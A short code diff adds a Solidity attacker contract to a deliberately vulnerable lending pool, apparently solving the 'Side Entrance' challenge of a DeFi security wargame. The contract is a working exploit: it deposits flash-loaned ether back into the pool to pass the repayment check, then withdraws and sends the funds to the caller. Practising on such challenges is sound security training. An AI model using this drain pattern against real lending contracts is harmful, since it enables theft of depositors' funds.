@@ -35,4 +35,19 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
+
+contract FlashLoanEtherReceiver is IFlashLoanEtherReceiver {
+    function callFunction(address pool, uint256 amount) public {
+        SideEntranceLenderPool(pool).flashLoan(amount);
+    }
+    function execute() external override payable {
+        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
+    }
+    function sendFunction(address pool) public {
+        SideEntranceLenderPool(pool).withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    fallback() external payable {}
+}
  
